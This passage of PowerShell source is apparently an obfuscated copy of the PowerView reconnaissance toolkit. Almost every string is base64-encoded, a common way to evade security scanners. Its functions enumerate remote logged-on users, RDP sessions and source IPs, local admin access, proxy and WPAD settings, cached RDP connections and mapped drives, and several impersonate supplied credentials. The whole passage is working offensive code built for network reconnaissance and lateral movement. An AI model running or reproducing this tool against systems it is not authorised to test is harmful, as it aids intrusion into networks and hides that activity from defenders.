                        $UserName, $UserDomain = $UserName.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QA=="))))
                    }
                    else {
                        $UserName = $_
                        $UserDomain = $Null
                    }

                    $RegLoggedOnUser = New-Object PSObject
                    $RegLoggedOnUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JENvbXB1dGVyTmFtZQ==")))
                    $RegLoggedOnUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $UserDomain
                    $RegLoggedOnUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
                    $RegLoggedOnUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNJRA=="))) $_
                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlJlZ0xvZ2dlZE9uVXNlcg=="))))
                    $RegLoggedOnUser
                }
            }
            catch {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1SZWdMb2dnZWRPbl0gRXJyb3Igb3BlbmluZyByZW1vdGUgcmVnaXN0cnkgb24gJyRDb21wdXRlck5hbWUnIDogezB9"))) -f $_)
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetRDPSession {


    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            
            $Handle = $Wtsapi32::WTSOpenServerEx($Computer)

            
            if ($Handle -ne 0) {

                
                $ppSessionInfo = [IntPtr]::Zero
                $pCount = 0

                
                $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                
                $Offset = $ppSessionInfo.ToInt64()

                if (($Result -ne 0) -and ($Offset -gt 0)) {

                    
                    $Increment = $WTS_SESSION_INFO_1::GetSize()

                    
                    for ($i = 0; ($i -lt $pCount); $i++) {

                        
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                        $RDPSession = New-Object PSObject

                        if ($Info.pHostName) {
                            $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Info.pHostName
                        }
                        else {
                            
                            $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                        }

                        $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbk5hbWU="))) $Info.pSessionName

                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            
                            $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9"))) -f $($Info.pUserName))
                        }
                        else {
                            $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9XHsxfQ=="))) -f $($Info.pDomainName), $($Info.pUserName))
                        }

                        $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SUQ="))) $Info.SessionID
                        $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RhdGU="))) $Info.State

                        $ppBuffer = [IntPtr]::Zero
                        $pBytesReturned = 0

                        
                        
                        $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $LastError2).Message))
                        }
                        else {
                            $Offset2 = $ppBuffer.ToInt64()
                            $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                            $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                            $SourceIP = $Info2.Address
                            if ($SourceIP[2] -ne 0) {
                                $SourceIP = [String]$SourceIP[2]+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))+[String]$SourceIP[3]+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))+[String]$SourceIP[4]+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))+[String]$SourceIP[5]
                            }
                            else {
                                $SourceIP = $Null
                            }

                            $RDPSession | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U291cmNlSVA="))) $SourceIP
                            $RDPSession.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlJEUFNlc3Npb25JbmZv"))))
                            $RDPSession

                            
                            $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                            $Offset += $Increment
                        }
                    }
                    
                    $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                }
                else {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
                }
                
                $Null = $Wtsapi32::WTSCloseServer($Handle)
            }
            else {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvciBvcGVuaW5nIHRoZSBSZW1vdGUgRGVza3RvcCBTZXNzaW9uIEhvc3QgKFJEIFNlc3Npb24gSG9zdCkgc2VydmVyIGZvcjogJENvbXB1dGVyTmFtZQ==")))
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Test-AdminAccess {


    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            
            $Handle = $Advapi32::OpenSCManagerW(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkQ29tcHV0ZXI="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZXNBY3RpdmU="))), 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $IsAdmin = New-Object PSObject
            $IsAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer

            
            if ($Handle -ne 0) {
                $Null = $Advapi32::CloseServiceHandle($Handle)
                $IsAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNBZG1pbg=="))) $True
            }
            else {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1Rlc3QtQWRtaW5BY2Nlc3NdIEVycm9yOiB7MH0="))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
                $IsAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNBZG1pbg=="))) $False
            }
            $IsAdmin.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFkbWluQWNjZXNz"))))
            $IsAdmin
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetComputerSiteName {


    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            if ($Computer -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Xig/OlswLTldezEsM31cLil7M31bMC05XXsxLDN9JA==")))) {
                $IPAddress = $Computer
                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
            }
            else {
                $IPAddress = @(Resolve-IPAddress -ComputerName $Computer)[0].IPAddress
            }

            $PtrInfo = [IntPtr]::Zero

            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)

            $ComputerSite = New-Object PSObject
            $ComputerSite | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
            $ComputerSite | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SVBBZGRyZXNz"))) $IPAddress

            if ($Result -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
                $ComputerSite | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU="))) $Sitename
            }
            else {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRDb21wdXRlclNpdGVOYW1lXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $Result).Message))
                $ComputerSite | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU="))) ''
            }
            $ComputerSite.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkNvbXB1dGVyU2l0ZQ=="))))

            
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)

            $ComputerSite
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-WMIRegProxy {


    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGlzdA=="))) = $True
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3M="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RkUmVnUHJvdg==")))
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZXNwYWNl"))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cm9vdFxkZWZhdWx0")))
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJuYW1l"))) = $Computer
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3JBY3Rpb24="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcA==")))
                }
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $WmiArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

                $RegProvider = Get-WmiObject @WmiArguments
                $Key = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cSW50ZXJuZXQgU2V0dGluZ3M=")))

                
                $HKCU = 2147483649
                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJveHlTZXJ2ZXI=")))).sValue
                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXV0b0NvbmZpZ1VSTA==")))).sValue

                $Wpad = ''
                if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($AutoConfigURL)
                    }
                    catch {
                        Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdQcm94eV0gRXJyb3IgY29ubmVjdGluZyB0byBBdXRvQ29uZmlnVVJMIDogJEF1dG9Db25maWdVUkw=")))
                    }
                }

                if ($ProxyServer -or $AutoConfigUrl) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJveHlTZXJ2ZXI="))) $ProxyServer
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXV0b0NvbmZpZ1VSTA=="))) $AutoConfigURL
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3BhZA=="))) $Wpad
                    $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlByb3h5U2V0dGluZ3M="))))
                    $Out
                }
                else {
                    Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdQcm94eV0gTm8gcHJveHkgc2V0dGluZ3MgZm91bmQgZm9yICRDb21wdXRlck5hbWU=")))
                }
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdQcm94eV0gRXJyb3IgZW51bWVyYXRpbmcgcHJveHkgc2V0dGluZ3MgZm9yICRDb21wdXRlck5hbWUgOiB7MH0="))) -f $_)
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {


    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $HKLM = 2147483650

            $WmiArguments = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGlzdA=="))) = $True
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3M="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RkUmVnUHJvdg==")))
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZXNwYWNl"))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cm9vdFxkZWZhdWx0")))
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJuYW1l"))) = $Computer
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3JBY3Rpb24="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2lsZW50bHlDb250aW51ZQ==")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $WmiArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

            
            try {
                $Reg = Get-WmiObject @WmiArguments

                $Key = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQXV0aGVudGljYXRpb25cTG9nb25VSQ==")))
                $Value = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ2dlZE9uVXNlcg==")))
                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $LastLoggedOn = New-Object PSObject
                $LastLoggedOn | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                $LastLoggedOn | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ2dlZE9u"))) $LastUser
                $LastLoggedOn.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lkxhc3RMb2dnZWRPblVzZXI="))))
                $LastLoggedOn
            }
            catch {
                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdMYXN0TG9nZ2VkT25dIEVycm9yIG9wZW5pbmcgcmVtb3RlIHJlZ2lzdHJ5IG9uICRDb21wdXRlci4gUmVtb3RlIHJlZ2lzdHJ5IGxpa2VseSBub3QgZW5hYmxlZC4=")))
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {


    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $HKU = 2147483651

            $WmiArguments = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGlzdA=="))) = $True
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3M="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RkUmVnUHJvdg==")))
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZXNwYWNl"))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cm9vdFxkZWZhdWx0")))
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJuYW1l"))) = $Computer
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3JBY3Rpb24="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcA==")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $WmiArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJA=="))) }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        
                        $ConnectionKeys = $Reg.EnumValues($HKU,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdA==")))).sNames

                        ForEach ($Connection in $ConnectionKeys) {
                            
                            if ($Connection -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TVJVLio=")))) {
                                $TargetServer = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdA=="))), $Connection).sValue

                                $FoundConnection = New-Object PSObject
                                $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                                $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
                                $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNJRA=="))) $UserSID
                                $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2VydmVy"))) $TargetServer
                                $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWVIaW50"))) $Null
                                $FoundConnection.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkNhY2hlZFJEUENvbm5lY3Rpb24="))))
                                $FoundConnection
                            }
                        }

                        
                        $ServerKeys = $Reg.EnumKey($HKU,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcU2VydmVycw==")))).sNames

                        ForEach ($Server in $ServerKeys) {

                            $UsernameHint = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcU2VydmVyc1wkU2VydmVy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWVIaW50")))).sValue

                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNJRA=="))) $UserSID
                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2VydmVy"))) $Server
                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWVIaW50"))) $UsernameHint
                            $FoundConnection.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkNhY2hlZFJEUENvbm5lY3Rpb24="))))
                            $FoundConnection
                        }
                    }
                    catch {
                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uXSBFcnJvcjogezB9"))) -f $_)
                    }
                }
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uXSBFcnJvciBhY2Nlc3NpbmcgJENvbXB1dGVyLCBsaWtlbHkgaW5zdWZmaWNpZW50IHBlcm1pc3Npb25zIG9yIGZpcmV3YWxsIHJ1bGVzIG9uIGhvc3Q6IHswfQ=="))) -f $_)
            }
        }
    }
}


function Get-WMIRegMountedDrive {


    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $HKU = 2147483651

            $WmiArguments = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGlzdA=="))) = $True
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3M="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RkUmVnUHJvdg==")))
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZXNwYWNl"))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cm9vdFxkZWZhdWx0")))
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJuYW1l"))) = $Computer
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3JBY3Rpb24="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcA==")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $WmiArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJA=="))) }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        $DriveLetters = ($Reg.EnumKey($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcTmV0d29yaw=="))))).sNames

                        ForEach ($DriveLetter in $DriveLetters) {
